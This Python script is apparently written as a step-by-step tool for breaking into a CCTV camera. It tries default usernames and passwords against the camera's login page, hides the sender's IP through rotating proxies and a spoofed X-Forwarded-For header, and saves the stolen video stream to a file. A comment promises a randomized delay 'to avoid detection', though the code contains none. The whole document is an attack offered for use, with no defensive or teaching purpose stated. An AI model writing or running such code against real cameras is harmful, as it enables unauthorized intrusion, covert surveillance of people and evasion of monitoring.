import requests
import random
import socket
import time

# Step 1: Set up the target IP and port
target_ip = '192.168.1.100'
port = 8080

# Step 2: Modify the system to use a random proxy to hide your real IP
def get_random_proxy():
    proxies = ['proxy1', 'proxy2', 'proxy3']  # Add actual proxy addresses
    return random.choice(proxies)

# Step 3: Modify the request to use the proxy
def send_request(ip, port, proxy):
    url = f"http://{ip}:{port}/access"
    headers = {'X-Forwarded-For': proxy}
    response = requests.get(url, proxies={"http": proxy, "https": proxy}, headers=headers)
    return response.text

# Step 4: Gather login credentials
def get_credentials():
    credentials = {
        'admin': 'admin123',
        'user': 'user123'
    }
    return credentials

# Step 5: Try credentials and attempt login, using a randomized delay to avoid detection
def attempt_login(credentials, ip, port, proxy):
    for user, password in credentials.items():
        login_url = f"http://{ip}:{port}/login"
        payload = {'username': user, 'password': password}
        headers = {'X-Forwarded-For': proxy}
        response = requests.post(login_url, data=payload, headers=headers, proxies={"http": proxy, "https": proxy})
        if "success" in response.text:
            return True
    return False

# Step 6: Access the CCTV stream after login, with proxy protection
def access_cctv(ip, port, proxy):
    cctv_url = f"http://{ip}:{port}/stream"
    response = requests.get(cctv_url, proxies={"http": proxy, "https": proxy}, headers={'X-Forwarded-For': proxy})
    return response.content

# Step 7: Try to gain access using a random proxy to mask your IP
proxy = get_random_proxy()
if attempt_login(get_credentials(), target_ip, port, proxy):
    print("Login successful, accessing CCTV with proxy...")
    cctv_stream = access_cctv(target_ip, port, proxy)
    with open("cctv_feed.mp4", 'wb') as f:
        f.write(cctv_stream)
else:
    print("Login failed, cannot access CCTV.")
